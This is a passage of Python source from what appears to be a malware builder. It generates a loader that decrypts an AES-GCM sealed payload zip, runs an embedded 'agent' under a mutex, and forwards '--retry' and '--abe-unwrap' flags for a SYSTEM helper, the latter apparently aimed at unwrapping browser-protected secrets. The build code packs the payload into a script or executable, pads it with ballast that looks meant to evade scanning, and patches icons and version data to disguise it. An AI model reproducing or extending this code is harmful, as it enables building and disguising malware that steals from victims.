        salt,
        dkLen=KEY_BYTES,
        count=KDF_ITERATIONS,
        hmac_hash_module=SHA256,
    )
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError as exc:
        raise SystemExit("seal key rejected the payload") from exc


def main() -> int:
    workspace = Path(tempfile.mkdtemp(prefix="sable-"))
    target = workspace / "payload.zip"
    target.write_bytes(_open_sealed(SEALED))

    sys.path.insert(0, str(target))
    try:
        from agent import entry, loader

        if not loader.acquire(MUTEX):
            return 0

        loader.adopt(zipfile.ZipFile(target), workspace, target)
        # argv is forwarded, not dropped: the retry task re-runs this image with
        # ``--retry`` and the SYSTEM unwrap helper re-runs it with ``--abe-unwrap``.
        # A bootstrap that called ``main([])`` started the agent normally both times.
        return int(entry.main(sys.argv[1:]))
    finally:
        try:
            sys.path.remove(str(target))
        except ValueError:
            pass
        shutil.rmtree(workspace, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
'''


def script_text(sealed: bytes, seal_key: str, mutex: str) -> str:
    """The ``.py`` artifact as text. Deterministic for a given seal."""
    if not seal_key.strip():
        raise ForgeError("seal key is empty")
    if not mutex.strip():
        raise ForgeError("mutex is empty")

    encoded = base64.b64encode(sealed).decode("ascii")
    lines = "\n".join(f'    b"{encoded[index:index + 76]}"' for index in range(0, len(encoded), 76))
    return _SCRIPT_TEMPLATE.format(
        mutex=repr(mutex), key=repr(seal_key), blob="\n" + lines + "\n"
    )


def build(
    cfg: RunConfig,
    sealed: bytes,
    destination: Path,
    *,
    mode: str = OUTPUT_EXE,
    stub: Path | None = None,
    icon: Path | None = None,
    version: VersionConfig | None = None,
) -> Path:
    """Write the finished artifact. Returns ``destination``."""
    if mode not in OUTPUT_MODES:
        raise ForgeError(f"{mode!r}: expected one of {', '.join(OUTPUT_MODES)}")
    if len(sealed) < MIN_SEALED_BYTES:
        raise ForgeError(f"sealed payload is {len(sealed)} bytes, needs {MIN_SEALED_BYTES}")

    expected = _EXTENSIONS[mode]
    if destination.suffix.lower() != expected:
        raise ForgeError(f"{destination.name}: {mode} output must end {expected}")

    if mode == OUTPUT_EXE:
        if stub is None:
            raise ForgeError("exe output needs a frozen stub")
        ballast = _ballast(cfg.ballast_mb)
        # The patch changes the launcher's size, so the offset the footer records has to
        # come from the patched copy. Passing the staged path through means the one
        # place that computes it stays the one place that computes it. Icon and version
        # are one staging pass: two update cycles would re-append the launcher's archive
        # twice, and the second tail is not a tail any loader expects.
        with _patched_stub(stub, icon=icon, version=version) as patched:
            return _write_exe(destination, patched, sealed, ballast, cfg)

    # Script output carries no ballast. The pad exists to change the size of a
    # binary; padding a text file with comment lines would only make the build
    # slower to read for the same number. Recorded in DECISIONS.md.
    return _write_script(destination, sealed, cfg)


__all__ = [
    "BOUND_SUFFIXES",
    "CONFIG_MEMBER",
    "FOOTER_MAGIC",
    "FOOTER_SIZE",
    "FUSE_PREFIX",
    "KEY_SLOT",
    "MAX_FUSE_BYTES",
    "MAX_ICON_BYTES",
    "MAX_VERSION_BYTES",
    "MUTEX_SLOT",
    "OUTPUT_EXE",
    "OUTPUT_MODES",
    "OUTPUT_PY",
    "SCHEMA_MEMBER",
    "TRAILER_MAGIC",
    "TRAILER_SIZE",
    "ForgeError",
    "IconEntry",
    "OutputMode",
    "ResourceRef",
    "build",
    "expected_offset",
    "group_payload",
    "icon_entries",
    "image_end",
    "patch_icon",
    "patch_resources",
    "payload",
    "resource_refs",
    "script_text",
    "trailer",
    "version_blob",
    "version_parts",
]
